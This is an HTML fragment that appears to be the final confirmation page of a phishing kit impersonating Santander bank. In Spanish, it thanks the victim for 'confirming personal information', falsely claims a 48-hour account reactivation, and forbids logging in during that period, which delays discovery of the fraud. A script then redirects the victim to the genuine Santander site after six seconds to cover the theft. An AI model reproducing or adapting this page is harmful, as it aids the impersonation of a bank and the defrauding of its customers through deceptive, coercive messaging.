...
<html style="display: flex; flex-direction: column; height: 100%;">
    ...
    <body style="display: flex; flex-direction: column; height: 100%;">
            ...
            <div class="container_details">
                ...
                <form>
                    <div class="title_form text-center w-100">
                        <img src="./Assets/imgs/succes.png" width="70" alt="">
                        <h1 class="mb-1 mt-2">Gracias por confirmar su información personal.</h1>
                        <p class="mt-0">
                            Tenga en cuenta que el proceso de reactivación demora 48 horas y que tiene estrictamente prohibido volver a conectarse a su aplicación o al sitio web durante las próximas 48 horas para garantizar un proceso de reactivación sin problemas.
                            <br><br>
                            Santander
                            <br><br>
        ...
        <script>
            setTimeout(function () {
                window.location.href= 'https://www.bancosantander.es/particulares';
            },6000); // 1000 = 1s  
        </script>
